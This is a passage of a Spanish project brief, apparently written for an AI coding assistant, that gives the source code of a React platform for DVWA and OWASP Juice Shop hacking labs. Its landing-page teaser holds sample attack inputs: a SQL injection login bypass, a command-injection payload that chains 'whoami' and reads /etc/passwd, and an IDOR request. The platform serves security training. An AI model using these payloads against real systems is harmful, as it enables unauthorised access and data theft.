# CONTEXTO DEL PROYECTO: Plataforma Web de Laboratorios de Ciberseguridad

Eres un asistente de desarrollo experto que actuará como copiloto técnico para este proyecto.
A continuación tienes la descripción de la arquitectura, funcionamiento y el CÓDIGO FUENTE COMPLETO de la plataforma web.

---

## 1. Resumen Ejecutivo del Proyecto
- **Propósito**: Plataforma web interactiva para aprendizaje y resolución de laboratorios de ciberseguridad práctica (DVWA y OWASP Juice Shop) alojados en una Raspberry Pi / servidor local.
- **Tecnologías**: React 19, Vite, JavaScript moderno (ES Modules), CSS nativo modularizado y responsivo.
- **Almacenamiento**: localStorage del navegador para persistencia de la IP de la Raspberry Pi, progreso de módulos/pasos y validación de flags/evidencias.
- **Comunicación**:
  - Directa con la Raspberry Pi por HTTP/puertos (DVWA en puerto 80, Juice Shop en puerto 3000).
  - Integración opcional con agente Raspberry Pi en puerto 3001 (para control de servicios/contenedores).

---

## 2. Estructura de Vistas y Componentes
- App.jsx: Orquestador principal de estado y vistas:
  - enLanding: Portada con presentación de laboratorios y simulador de comandos.
  - ista === 'labs':
    - Si labSeleccionado === null: Muestra GridLabs.jsx con estado de conectividad e inventario de labs.
    - Si labSeleccionado !== null: Muestra DetalleLab.jsx que monta RoadmapLab.jsx con los módulos y pasos del lab elegido.
  - ista === 'roadmap': Muestra Roadmap.jsx con el árbol de aprendizaje temático global por fases.
  - ista === 'instalacion': Muestra ModuloInstalacion.jsx con el paso a paso de virtualización (VirtualBox, Kali Linux).
  - ista === 'config-ip': Muestra FormularioIp.jsx para configurar/cambiar la IP de destino.
- VerificadorFlag.jsx: Sistema interactivo de comprobación de flags/evidencias por cada paso práctico, con normalización y aceptación de variantes.
- progreso.js: Controlador de persistencia en localStorage (progreso por paso, módulo y flags verificadas).
- oadmapsData.js: Contenido curricular detallado con explicaciones pedagógicas, pasos, comandos, payloads, flags aceptadas y soluciones.

---

## 3. Código Fuente Completo de los Archivos

### Archivo: `frontend/package.json`
``json
{
  "name": "frontend",
  "private": true,
  "version": "0.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "lint": "eslint .",
    "preview": "vite preview"
  },
  "dependencies": {
    "react": "^19.2.7",
    "react-dom": "^19.2.7"
  },
  "devDependencies": {
    "@eslint/js": "^10.0.1",
    "@types/react": "^19.2.17",
    "@types/react-dom": "^19.2.3",
    "@vitejs/plugin-react": "^6.0.3",
    "eslint": "^10.6.0",
    "eslint-plugin-react-hooks": "^7.1.1",
    "eslint-plugin-react-refresh": "^0.5.3",
    "globals": "^17.7.0",
    "vite": "^8.1.1"
  }
}

``

### Archivo: `frontend/vite.config.js`
``javascript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

// https://vite.dev/config/
export default defineConfig({
  plugins: [react()],
})

``

### Archivo: `frontend/index.html`
``html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap"
      rel="stylesheet"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>IP</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>

``

### Archivo: `frontend/src/main.jsx`
``javascript
import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'
import './index.css'
import App from './App.jsx'

createRoot(document.getElementById('root')).render(
  <StrictMode>
    <App />
  </StrictMode>,
)
``

### Archivo: `frontend/src/App.jsx`
``javascript
import { useState, useEffect, useCallback } from 'react';
import './App.css';
import { obtenerUrlLab } from './data/labsInfo.js';
import { MODULO_INSTALACION } from './data/roadmapsData.js';
import Landing from './components/Landing.jsx';
import FormularioIp from './components/FormularioIp.jsx';
import NavBar from './components/NavBar.jsx';
import GridLabs from './components/GridLabs.jsx';
import DetalleLab from './components/DetalleLab.jsx';
import Roadmap from './components/Roadmap.jsx';
import ModuloInstalacion from './components/ModuloInstalacion.jsx';

function App() {
  const [enLanding, setEnLanding] = useState(true);
  const [ip, setIp] = useState(null);
  const [inputIp, setInputIp] = useState('');
  const [vista, setVista] = useState('labs'); // 'labs', 'roadmap', 'config-ip', 'instalacion'
  const [labSeleccionado, setLabSeleccionado] = useState(null);
  const [moduloSeleccionado, setModuloSeleccionado] = useState(null);
  const [historial, setHistorial] = useState([]);

  useEffect(() => {
    const ipGuardada = localStorage.getItem('ip_pi');
    if (ipGuardada) {
      setIp(ipGuardada);
      setInputIp(ipGuardada);
    }
  }, []);

  const guardarIp = () => {
    const ipLimpia = inputIp.trim();
    if (!ipLimpia) return;
    localStorage.setItem('ip_pi', ipLimpia);
    setIp(ipLimpia);
    // Volver a la vista previa o a laboratorios
    if (historial.length > 0) {
      volverAtras();
    } else {
      setVista('labs');
      setEnLanding(false);
    }
  };

  const abrirFormularioIp = () => {
    setHistorial((prev) => [...prev, { enLanding, vista, labSeleccionado, moduloSeleccionado }]);
    setEnLanding(false);
    setVista('config-ip');
  };

  const cambiarIp = () => {
    abrirFormularioIp();
  };

  const abrirLab = (nombre) => {
    const url = obtenerUrlLab(ip, nombre);
    window.open(url, '_blank');
  };

  const seleccionarLabConModulo = (nombreLab, moduloId = null) => {
    setHistorial((prev) => [...prev, { enLanding, vista, labSeleccionado, moduloSeleccionado }]);
    setEnLanding(false);
    setVista('labs');
    setLabSeleccionado(nombreLab);
    setModuloSeleccionado(moduloId);
  };

  const irA = (nuevaVista) => {
    setHistorial((prev) => [...prev, { enLanding, vista, labSeleccionado, moduloSeleccionado }]);
    setEnLanding(false);
    setVista(nuevaVista);
    setLabSeleccionado(null);
    setModuloSeleccionado(null);
  };

  const irAlHome = () => {
    setHistorial((prev) => [...prev, { enLanding, vista, labSeleccionado, moduloSeleccionado }]);
    setEnLanding(true);
  };

  const volverAtras = useCallback(() => {
    if (historial.length > 0) {
      const nuevoHistorial = [...historial];
      const estadoAnterior = nuevoHistorial.pop();
      setHistorial(nuevoHistorial);
      setEnLanding(estadoAnterior.enLanding);
      setVista(estadoAnterior.vista);
      setLabSeleccionado(estadoAnterior.labSeleccionado);
      setModuloSeleccionado(estadoAnterior.moduloSeleccionado);
    } else {
      // Si no hay historial previo, volver a la pantalla principal
      if (labSeleccionado) {
        setLabSeleccionado(null);
        setModuloSeleccionado(null);
      } else if (!enLanding) {
        setEnLanding(true);
      }
    }
  }, [historial, labSeleccionado, enLanding]);

  if (enLanding) {
    return (
      <Landing
        ip={ip}
        onIrALabs={() => irA('labs')}
        onIrARoadmap={() => irA('roadmap')}
        onIrAConfigIp={abrirFormularioIp}
      />
    );
  }

  if (vista === 'config-ip' || (!ip && !enLanding)) {
    return (
      <FormularioIp
        inputIp={inputIp}
        setInputIp={setInputIp}
        onGuardar={guardarIp}
        onVolver={volverAtras}
        esCambio={Boolean(ip)}
      />
    );
  }

  return (
    <div className="app-shell">
      <NavBar
        ip={ip}
        vista={vista}
        irA={irA}
        irAlHome={irAlHome}
        cambiarIp={cambiarIp}
      />

      <main className="app-main">
        {vista === 'labs' && !labSeleccionado && (
          <GridLabs
            ip={ip}
            onSeleccionar={(nombre) => seleccionarLabConModulo(nombre, null)}
            onVolver={volverAtras}
            onIrAInstalacion={() => irA('instalacion')}
          />
        )}

        {vista === 'labs' && labSeleccionado && (
          <DetalleLab
            nombreLab={labSeleccionado}
            moduloInicialId={moduloSeleccionado}
            ip={ip}
            onVolver={volverAtras}
            onAbrir={abrirLab}
          />
        )}

        {vista === 'roadmap' && (
          <Roadmap
            onSeleccionarLabModulo={seleccionarLabConModulo}
            onSeleccionarInstalacion={() => irA('instalacion')}
            onVolver={volverAtras}
          />
        )}

        {vista === 'instalacion' && (
          <ModuloInstalacion
            modulo={MODULO_INSTALACION}
            onVolver={volverAtras}
          />
        )}
      </main>
    </div>
  );
}

export default App;
``

### Archivo: `frontend/src/api/agente.js`
``javascript
// Cliente API para comunicarse con el agente de control en la Raspberry Pi (puerto 3001)

export async function obtenerLabs(ip) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 segundos de timeout

  try {
    const respuesta = await fetch(`http://${ip}:3001/labs`, {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (!respuesta.ok) return [];
    return await respuesta.json();
  } catch {
    return [];
  }
}

export async function accionLab(ip, nombre, accion) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 5000);

  try {
    const respuesta = await fetch(
      `http://${ip}:3001/labs/${encodeURIComponent(nombre)}/${accion}`,
      { method: 'POST', signal: controller.signal }
    );
    clearTimeout(timeoutId);
    return await respuesta.json();
  } catch (error) {
    return { error: 'No se pudo conectar con el agente en el puerto 3001' };
  }
}
``

### Archivo: `frontend/src/data/labsInfo.js`
``javascript
import { ROADMAP_MODULOS, obtenerRoadmapLab } from './roadmapsData.js';

export { ROADMAP_MODULOS, obtenerRoadmapLab };

// Configuración real de rutas y puertos en la Raspberry Pi
export const CONFIG_LABS = {
  DVWA: {
    puerto: 8080,
    ruta: '/',
    descripcionCorta: 'Servidor PHP/MySQL en el puerto 8080 de la Raspberry Pi',
  },
  'OWASP Juice Shop': {
    puerto: 3000,
    ruta: '/',
    rutaAlternativa: '/juice-shop/',
    descripcionCorta: 'Aplicación Node.js en puerto 3000 de la Raspberry Pi',
  },
};

// Rutas directas a cada módulo/vulnerabilidad para evitar fallos de resolución relativa (404)
export const RUTAS_MODULOS = {
  // DVWA
  'dvwa-brute-force': '/dvwa/vulnerabilities/brute/',
  'dvwa-command-injection': '/dvwa/vulnerabilities/exec/',
  'dvwa-csrf': '/dvwa/vulnerabilities/csrf/',
  'dvwa-fi': '/dvwa/vulnerabilities/fi/?page=include.php',
  'dvwa-sqli': '/dvwa/vulnerabilities/sqli/',
  'dvwa-upload': '/dvwa/vulnerabilities/upload/',
  'dvwa-xss-reflected': '/dvwa/vulnerabilities/xss_r/',
  'dvwa-xss-stored': '/dvwa/vulnerabilities/xss_s/',
  // OWASP Juice Shop
  'juice-sql': '/',
  'juice-idor': '/#/score-board',
  'juice-xss': '/',
  'juice-broken-auth': '/#/login',
  'juice-security-misconfig': '/',
};

export function obtenerUrlModulo(ip, nombreLab, moduloId) {
  if (!ip) return '#';
  if (nombreLab === 'DVWA') {
    const ruta = RUTAS_MODULOS[moduloId] || '/dvwa/';
    return `http://${ip}${ruta}`;
  }
  if (nombreLab === 'OWASP Juice Shop') {
    const ruta = RUTAS_MODULOS[moduloId] || '/';
    return `http://${ip}:3000${ruta}`;
  }
  return `http://${ip}/`;
}

export function obtenerUrlSecurityDvwa(ip) {
  return ip ? `http://${ip}/dvwa/security.php` : '#';
}

export function obtenerPuertoLab(nombreLab, labObj) {
  if (labObj?.puerto) return labObj.puerto;
  if (labObj?.port) return labObj.port;
  return CONFIG_LABS[nombreLab]?.puerto ?? 80;
}

export function obtenerUrlLab(ip, nombreLab, labObj) {
  const conf = CONFIG_LABS[nombreLab];
  const puerto = obtenerPuertoLab(nombreLab, labObj);
  const ruta = conf?.ruta || '/';

  // Si el puerto es el 80 estándar, no concatenamos el número de puerto en la URL
  if (puerto === 80) {
    return `http://${ip}${ruta}`;
  }

  return `http://${ip}:${puerto}${ruta}`;
}

export const ROADMAP = [
  {
    nombre: 'DVWA',
    nivel: 1,
    puerto: 80,
    ruta: '/dvwa/',
    categoria: 'OWASP Top 10 Clásico',
    descripcion: 'Vulnerabilidades en PHP/MySQL alojadas en /dvwa/ de la Raspberry Pi con niveles de dificultad ajustables.',
    modulosCount: ROADMAP_MODULOS.DVWA?.modulos?.length || 8,
  },
  {
    nombre: 'OWASP Juice Shop',
    nivel: 1,
    puerto: 3000,
    ruta: '/',
    categoria: 'SPA Moderna & API REST',
    descripcion: 'Tienda en Angular y Node.js desplegada en el puerto 3000 de la Raspberry Pi con más de 100 retos.',
    modulosCount: ROADMAP_MODULOS['OWASP Juice Shop']?.modulos?.length || 5,
  },
];

export const LAB_INFO = {
  DVWA: {
    descripcion: 'Aplicación PHP con vulnerabilidades del OWASP Top 10 alojada en /dvwa/ de la Raspberry Pi.',
  },
  'OWASP Juice Shop': {
    descripcion: 'Tienda moderna en Node.js y Angular alojada en el puerto 3000 de la Raspberry Pi con retos dinámicos.',
  },
};

``

### Archivo: `frontend/src/data/progreso.js`
``javascript
const CLAVE_PROGRESO = 'progreso_labs';
const CLAVE_PASOS = 'progreso_pasos_modulos';

function leerJSON(clave) {
  try {
    const datos = localStorage.getItem(clave);
    return datos ? JSON.parse(datos) : {};
  } catch {
    return {};
  }
}

function guardarJSON(clave, valor) {
  localStorage.setItem(clave, JSON.stringify(valor));
}

// --- Retos clásicos del lab ---
export function obtenerRetosCompletados(nombreLab) {
  const progreso = leerJSON(CLAVE_PROGRESO);
  return progreso[nombreLab] || [];
}

export function alternarReto(nombreLab, indiceReto) {
  const progreso = leerJSON(CLAVE_PROGRESO);
  const completados = new Set(progreso[nombreLab] || []);

  if (completados.has(indiceReto)) {
    completados.delete(indiceReto);
  } else {
    completados.add(indiceReto);
  }

  progreso[nombreLab] = Array.from(completados);
  guardarJSON(CLAVE_PROGRESO, progreso);
  return progreso[nombreLab];
}

// --- Pasos por Módulo del Roadmap ---
export function obtenerPasosCompletadosModulo(nombreLab, moduloId) {
  const progreso = leerJSON(CLAVE_PASOS);
  const claveModulo = `${nombreLab}::${moduloId}`;
  return progreso[claveModulo] || [];
}

export function alternarPasoModulo(nombreLab, moduloId, pasoIndex) {
  const progreso = leerJSON(CLAVE_PASOS);
  const claveModulo = `${nombreLab}::${moduloId}`;
  const completados = new Set(progreso[claveModulo] || []);

  if (completados.has(pasoIndex)) {
    completados.delete(pasoIndex);
  } else {
    completados.add(pasoIndex);
  }

  progreso[claveModulo] = Array.from(completados);
  guardarJSON(CLAVE_PASOS, progreso);
  return progreso[claveModulo];
}

export function marcarTodosPasosModulo(nombreLab, moduloId, totalPasos, marcarTodos) {
  const progreso = leerJSON(CLAVE_PASOS);
  const claveModulo = `${nombreLab}::${moduloId}`;

  if (marcarTodos) {
    progreso[claveModulo] = Array.from({ length: totalPasos }, (_, i) => i);
  } else {
    progreso[claveModulo] = [];
  }

  guardarJSON(CLAVE_PASOS, progreso);
  return progreso[claveModulo];
}

export function obtenerEstadisticasLab(nombreLab, modulos) {
  if (!modulos || modulos.length === 0) {
    return { totalPasos: 0, pasosCompletados: 0, modulosCompletados: 0, porcentaje: 0 };
  }

  let totalPasos = 0;
  let pasosCompletados = 0;
  let modulosCompletados = 0;

  modulos.forEach((mod) => {
    const totalModulo = mod.pasos?.length || 0;
    totalPasos += totalModulo;

    const resueltos = obtenerPasosCompletadosModulo(nombreLab, mod.id).length;
    pasosCompletados += resueltos;

    if (totalModulo > 0 && resueltos >= totalModulo) {
      modulosCompletados += 1;
    }
  });

  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletados / totalPasos) * 100) : 0;

  return {
    totalPasos,
    pasosCompletados,
    modulosCompletados,
    totalModulos: modulos.length,
    porcentaje,
  };
}

export function marcarPasoModuloCompletado(nombreLab, moduloId, pasoIdx) {
  const progreso = leerJSON(CLAVE_PASOS);
  const claveModulo = `${nombreLab}::${moduloId}`;
  const completados = new Set(progreso[claveModulo] || []);
  completados.add(pasoIdx);
  progreso[claveModulo] = Array.from(completados);
  guardarJSON(CLAVE_PASOS, progreso);
  return progreso[claveModulo];
}

export function desmarcarPasoModulo(nombreLab, moduloId, pasoIdx) {
  const progreso = leerJSON(CLAVE_PASOS);
  const claveModulo = `${nombreLab}::${moduloId}`;
  const completados = new Set(progreso[claveModulo] || []);
  completados.delete(pasoIdx);
  progreso[claveModulo] = Array.from(completados);
  guardarJSON(CLAVE_PASOS, progreso);
  return progreso[claveModulo];
}

// --- Verificación de Flags por PASO ---
const CLAVE_FLAGS_PASOS = 'flags_verificadas_pasos';

export function esFlagPasoVerificada(nombreLab, moduloId, pasoIdx) {
  const flags = leerJSON(CLAVE_FLAGS_PASOS);
  return flags[`${nombreLab}::${moduloId}::${pasoIdx}`] === true;
}

export function verificarFlagPaso(nombreLab, moduloId, pasoIdx, flagIngresada, flagCorrecta, flagsAceptadas = []) {
  const normalizar = (s) => (s || '').trim().toLowerCase();
  const ingresada = normalizar(flagIngresada);
  if (!ingresada) return false;

  const candidatas = [flagCorrecta, ...(Array.isArray(flagsAceptadas) ? flagsAceptadas : [])]
    .filter(Boolean)
    .map(normalizar);

  // Extraer también lo que está dentro de FLAG{...}
  const matchCanonico = (flagCorrecta || '').match(/flag\{([^}]+)\}/i);
  if (matchCanonico) {
    candidatas.push(normalizar(matchCanonico[1]));
  }

  const matchIngresado = ingresada.match(/flag\{([^}]+)\}/i);
  const textoSinEnvoltorio = matchIngresado ? normalizar(matchIngresado[1]) : ingresada;

  const esValida = candidatas.some((c) => {
    if (c === ingresada || c === textoSinEnvoltorio) return true;
    const matchC = c.match(/flag\{([^}]+)\}/i);
    if (matchC && (normalizar(matchC[1]) === ingresada || normalizar(matchC[1]) === textoSinEnvoltorio)) return true;
    return false;
  });

  if (esValida) {
    const flags = leerJSON(CLAVE_FLAGS_PASOS);
    flags[`${nombreLab}::${moduloId}::${pasoIdx}`] = true;
    guardarJSON(CLAVE_FLAGS_PASOS, flags);
    // Garantizar que el paso queda marcado como completado
    marcarPasoModuloCompletado(nombreLab, moduloId, pasoIdx);
    return true;
  }
  return false;
}

export function revocarFlagPaso(nombreLab, moduloId, pasoIdx) {
  const flags = leerJSON(CLAVE_FLAGS_PASOS);
  delete flags[`${nombreLab}::${moduloId}::${pasoIdx}`];
  guardarJSON(CLAVE_FLAGS_PASOS, flags);
  desmarcarPasoModulo(nombreLab, moduloId, pasoIdx);
}
``

### Archivo: `frontend/src/components/NavBar.jsx`
``javascript
function NavBar({ ip, vista, irA, irAlHome, cambiarIp }) {
  return (
    <nav className="navbar">
      <button className="navbar-logo" onClick={irAlHome}>
        Laboratorios Web
      </button>

      <div className="navbar-links">
        <button
          className={`navbar-link ${vista === 'labs' ? 'navbar-link-activo' : ''}`}
          onClick={() => irA('labs')}
        >
          Laboratorios
        </button>
        <button
          className={`navbar-link ${vista === 'roadmap' ? 'navbar-link-activo' : ''}`}
          onClick={() => irA('roadmap')}
        >
          Rutas de Aprendizaje
        </button>
      </div>

      <div className="navbar-ip">
        <span className="punto-estado"></span>
        <span className="navbar-ip-texto">{ip}</span>
        <button className="navbar-ip-cambiar" onClick={cambiarIp}>
          Cambiar IP
        </button>
      </div>
    </nav>
  );
}

export default NavBar;
``

### Archivo: `frontend/src/components/Landing.jsx`
``javascript
import { useState } from 'react';
import { ROADMAP } from '../data/labsInfo.js';

// Iconos representativos de los laboratorios
const LAB_ICONS = {
  DVWA: (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="mini-lab-svg">
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4" />
    </svg>
  ),
  'OWASP Juice Shop': (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="mini-lab-svg">
      <path strokeLinecap="round" strokeLinejoin="round" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M10 14h4" />
    </svg>
  ),
};

const EJEMPLOS_TERMINAL = [
  {
    id: 'sqli',
    nombre: 'Inyección SQL',
    lab: 'DVWA',
    comando: "SELECT * FROM users WHERE user = 'admin' AND password = '' OR '1'='1';",
    respuesta: '✓ Autenticación burlada con éxito · Hash recuperado: 5f4dcc3b5aa765d61d8327deb882cf99',
    tag: 'Bypass Auth',
  },
  {
    id: 'cmdi',
    nombre: 'Command Injection',
    lab: 'DVWA',
    comando: 'ping -c 1 127.0.0.1; whoami && cat /etc/passwd | head -n 2',
    respuesta: 'www-data\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
    tag: 'RCE / OS Shell',
  },
  {
    id: 'idor',
    nombre: 'IDOR en API REST',
    lab: 'OWASP Juice Shop',
    comando: 'GET /rest/basket/1 HTTP/1.1\nHost: <IP_LAB>:3000\nAuthorization: Bearer <TOKEN>',
    respuesta: 'HTTP/1.1 200 OK\n{"status":"success","data":{"id":1,"UserId":1,"Products":[{"id":1,"name":"Apple Juice","price":1.99}]}}',
    tag: 'Broken Access',
  },
];

function Landing({ ip, onIrALabs, onIrARoadmap, onIrAConfigIp }) {
  const [ejemploActivo, setEjemploActivo] = useState(0);
  const [menuAbierto, setMenuAbierto] = useState(false);

  const irAOpcion = (accion) => {
    setMenuAbierto(false);
    accion();
  };

  return (
    <div className="landing">
      {/* Barra Superior del Home con Menú Hamburguesa */}
      <header className="landing-topbar">
        <div className="landing-topbar-logo">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="topbar-logo-svg">
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" />
          </svg>
          <span>SecurityLab</span>
        </div>

        <div className="landing-topbar-acciones">
          {ip ? (
            <div className="topbar-ip-badge" title="IP de la Raspberry Pi conectada">
              <span className="topbar-ip-dot" />
              <span className="topbar-ip-txt">{ip}</span>
            </div>
          ) : (
            <button className="topbar-btn-sin-ip" onClick={onIrAConfigIp}>
              <span className="topbar-ip-dot-off" />
              <span>Configurar IP</span>
            </button>
          )}

          {/* Botón Hamburguesa */}
          <button
            type="button"
            className={`btn-hamburguesa ${menuAbierto ? 'hamburguesa-activa' : ''}`}
            onClick={() => setMenuAbierto((prev) => !prev)}
            aria-label="Abrir menú de navegación"
          >
            <span className="hamb-linea hamb-1" />
            <span className="hamb-linea hamb-2" />
            <span className="hamb-linea hamb-3" />
          </button>
        </div>
      </header>

      {/* Menú Desplegable / Drawer Overlay */}
      {menuAbierto && (
        <div className="hamburguesa-backdrop" onClick={() => setMenuAbierto(false)}>
          <div className="hamburguesa-drawer" onClick={(e) => e.stopPropagation()}>
            <div className="drawer-header">
              <span className="drawer-titulo">Navegación</span>
              <button
                type="button"
                className="drawer-btn-cerrar"
                onClick={() => setMenuAbierto(false)}
              >
                ✕
              </button>
            </div>

            {/* Estado de la IP en el Drawer */}
            <div className="drawer-ip-box">
              <div className="drawer-ip-info">
                <span className="drawer-ip-label">Raspberry Pi</span>
                <span className="drawer-ip-val">{ip || 'Sin IP configurada'}</span>
              </div>
              <button
                type="button"
                className="btn btn-secundario btn-drawer-ip"
                onClick={() => irAOpcion(onIrAConfigIp)}
              >
                {ip ? 'Cambiar IP' : 'Ingresar IP'}
              </button>
            </div>

            {/* Lista de Enlaces */}
            <nav className="drawer-links">
              <button
                type="button"
                className="drawer-link-item"
                onClick={() => irAOpcion(onIrALabs)}
              >
                <div className="drawer-link-icon">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="2" y="3" width="20" height="14" rx="2" />
                    <line x1="8" y1="21" x2="16" y2="21" />
                    <line x1="12" y1="17" x2="12" y2="21" />
                  </svg>
                </div>
                <div className="drawer-link-textos">
                  <span className="drawer-link-nombre">Laboratorios</span>
                  <span className="drawer-link-desc">DVWA & OWASP Juice Shop</span>
                </div>
                <span className="drawer-link-arrow">→</span>
              </button>

              <button
                type="button"
                className="drawer-link-item"
                onClick={() => irAOpcion(onIrARoadmap)}
              >
                <div className="drawer-link-icon icon-roadmap">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polyline points="4 17 10 11 4 5" />
                    <line x1="12" y1="19" x2="20" y2="19" />
                  </svg>
                </div>
                <div className="drawer-link-textos">
                  <span className="drawer-link-nombre">Roadmap General</span>
                  <span className="drawer-link-desc">Sendero progresivo de 15 temáticas</span>
                </div>
                <span className="drawer-link-arrow">→</span>
              </button>

              <button
                type="button"
                className="drawer-link-item"
                onClick={() => irAOpcion(onIrAConfigIp)}
              >
                <div className="drawer-link-icon icon-config">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="3" />
                    <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" />
                  </svg>
                </div>
                <div className="drawer-link-textos">
                  <span className="drawer-link-nombre">Configurar IP</span>
                  <span className="drawer-link-desc">Ajustar IP de la Raspberry Pi</span>
                </div>
                <span className="drawer-link-arrow">→</span>
              </button>
            </nav>
          </div>
        </div>
      )}

      {/* Hero Central */}
      <div className="landing-hero">
        <div className="hero-node-badge">
          <span className="hero-badge-ping" />
          <span className="hero-badge-dot" />
          Plataforma de Ciberseguridad Ofensiva · Raspberry Pi
        </div>

        <h1 className="landing-titulo">
          Domina la Seguridad Web en <span className="titulo-gradiente">Entornos Reales</span>
        </h1>

        <p className="landing-descripcion">
          Aprende a identificar, explotar y comprender vulnerabilidades del <strong>OWASP Top 10</strong> y arquitecturas modernas con guías paso a paso y entornos interactivos.
        </p>

        {/* Botones de acción principales */}
        <div className="landing-accesos">
          <button className="btn btn-primario btn-landing btn-hero-glow" onClick={onIrALabs}>
            <span>Entrar a los Laboratorios</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <path d="M5 12h14M12 5l7 7-7 7" />
            </svg>
          </button>

          <button className="btn btn-secundario btn-landing" onClick={onIrARoadmap}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M9 18l6-6-6-6" />
            </svg>
            <span>Ver Sendero de Temáticas</span>
          </button>
        </div>

        {/* Cinta de Métricas Rápidas */}
        <div className="landing-metricas-strip">
          <div className="metrica-item">
            <span className="metrica-val">15</span>
            <span className="metrica-txt">Módulos Prácticos</span>
          </div>
          <div className="metrica-divisor" />
          <div className="metrica-item">
            <span className="metrica-val">2</span>
            <span className="metrica-txt">Laboratorios Reales</span>
          </div>
          <div className="metrica-divisor" />
          <div className="metrica-item">
            <span className="metrica-val">100%</span>
            <span className="metrica-txt">Interactivo Paso a Paso</span>
          </div>
          <div className="metrica-divisor" />
          <div className="metrica-item">
            <span className="metrica-val">0</span>
            <span className="metrica-txt">Imágenes Falsas / Solo Código</span>
          </div>
        </div>
      </div>

      {/* Vista interactiva de terminal en vivo (Teaser) */}
      <div className="landing-terminal-section">
        <div className="terminal-card">
          <div className="terminal-topbar">
            <div className="terminal-dots">
              <span className="dot dot-red" />
              <span className="dot dot-yellow" />
              <span className="dot dot-green" />
            </div>
            <div className="terminal-tabs">
              {EJEMPLOS_TERMINAL.map((ej, idx) => (
                <button
                  key={ej.id}
                  type="button"
                  className={`terminal-tab ${ejemploActivo === idx ? 'activo' : ''}`}
                  onClick={() => setEjemploActivo(idx)}
                >
                  <span className="tab-lab-badge">{ej.lab}</span>
                  {ej.nombre}
                </button>
              ))}
            </div>
            <span className="terminal-title-tag">SIMULACIÓN INTERACTIVA</span>
          </div>

          <div className="terminal-body">
            <div className="terminal-row">
              <span className="terminal-prompt">$</span>
              <span className="terminal-cmd">{EJEMPLOS_TERMINAL[ejemploActivo].comando}</span>
            </div>
            <div className="terminal-row terminal-output">
              <pre>{EJEMPLOS_TERMINAL[ejemploActivo].respuesta}</pre>
            </div>
          </div>

          <div className="terminal-footer">
            <div className="terminal-tag-pill">
              Técnica: <strong>{EJEMPLOS_TERMINAL[ejemploActivo].tag}</strong>
            </div>
            <button className="terminal-cta-link" onClick={onIrALabs}>
              Practicar este ataque en los laboratorios →
            </button>
          </div>
        </div>
      </div>

      {/* Laboratorios disponibles */}
      <div className="landing-labs">
        <div className="landing-labs-encabezado">
          <div>
            <span className="etiqueta-comentario">// ENTORNOS DISPONIBLES</span>
            <h2>Elige tu Entorno de Práctica</h2>
          </div>
          <span className="link-roadmap" onClick={onIrARoadmap}>
            Explorar todas las 15 temáticas ordenadas →
          </span>
        </div>

        <div className="landing-labs-grid">
          {ROADMAP.map((lab) => {
            const icono = LAB_ICONS[lab.nombre] || (
